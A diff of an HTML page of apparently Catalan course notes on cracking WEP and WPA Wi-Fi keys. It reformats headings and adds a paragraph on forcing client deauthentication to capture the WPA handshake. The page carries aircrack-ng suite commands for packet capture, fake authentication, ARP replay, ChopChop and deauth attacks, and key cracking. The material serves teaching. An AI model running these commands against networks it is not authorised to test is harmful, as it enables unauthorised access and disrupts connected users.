@@ -368,13 +368,13 @@
     </ul>
 
     <h4>En resum:</h4>
-    <p><strong>Si hi ha molt trànsit en la xarxa</strong></p>
+    <h3><strong>OPCIÓ 1: Si hi ha molt trànsit en la xarxa</strong></h3>
     <p>En una terminal es capturen trames</p>
     <pre>airodump-ng --channel canal --bssid BSSID --write fitxer  wlan1</pre>
     <p>En altra terminal, es procedeix a crackejar, (quan es capturen al voltant de 100.000 trames )</p>
     <pre>aircrack-ng fitxer</pre>
 
-    <p><strong>Si hi ha poc trànsit en la xarxa</strong></p>
+    <hr><h3><strong>OPCIÓ 2: Si hi ha poc trànsit en la xarxa</strong></h3>
     <p>*** En este cas s'ha de generar el transit primer.....</p>
     <p>Varia, si la autenticació es OPEN o SKA</p>
 
@@ -405,12 +405,12 @@ aireplay-ng --fakeauth 0 -y fitxer.xor -a BSSID -h la_teua_mac  wlan1
 aireplay-ng --arpreplay -b BSSID -h la_teua_mac  wlan1      </pre>
     </ol>
 
-        <p>En els dos casos, en altra terminal, es crackeja la contrasenya</p>
-        <pre>aircrack-ng fitxer</pre>
+    <p>En els dos casos, en altra terminal, es crackeja la contrasenya</p>
+    <pre>aircrack-ng fitxer</pre>
 
-     <h4>Korek ChopChop</h4>   
-        <p>L’atac ChopChop: Agafa un paquet xifrat capturat, Va eliminant bytes del final del paquet, Envia versions manipulades del paquet al punt d’accés,
-        Observa si el punt d’accés accepta o rebutja el paquet. Amb aquestes respostes, l’atacant pot deduir byte a byte el contingut original.
+    <hr><h4>Korek ChopChop</h4>   
+    <p>L’atac ChopChop: Agafa un paquet xifrat capturat, Va eliminant bytes del final del paquet, Envia versions manipulades del paquet al punt d’accés,
+    Observa si el punt d’accés accepta o rebutja el paquet. Amb aquestes respostes, l’atacant pot deduir byte a byte el contingut original.
     Avui dia és més aviat educatiu o històric</p>
      <pre>aireplay-ng --chopchop -b BSSID -h MAC_client wlan1</pre>
 
@@ -424,6 +424,9 @@ aireplay-ng --arpreplay -b BSSID -h la_teua_mac  wlan1      </pre>
         la informació important està en el <strong>handshake</strong> , conegut con 4-way-handshake     </p>
         <pre>airodump-ng --channel canal --bssid BSSID --write fitxer  wlan1 
             ** Primer es posa a capturar en una finestra apart          </pre>
+    <p>Després s'ha de forçar la desautenticació d'un client connectat, per esperar, i si es torna a connectar, (cosa que fan molts clients, que si 
+        perden la connexió, automàticament tornen a intentar connectar sense interactuar amb l'usuari), i una vegada connecte, el <strong>handshake</strong> 
+    estarà capturat en el fitxer de la sessió/finestra que tenim escoltatn i capturant amb <code>airodump-ng</code></p>
         <pre>aireplay-ng --deauth 5 -a BSSID -c mac_client  wlan1</pre>
     <p>   Una vegada capturat el handshake, es realitza un atac de força bruta o diccionari per obtindre la clau o passowrd. Per tant, la seguretat 
         d'este tipus de xarxes resideix en la fortalesa de la clau.      </p> 
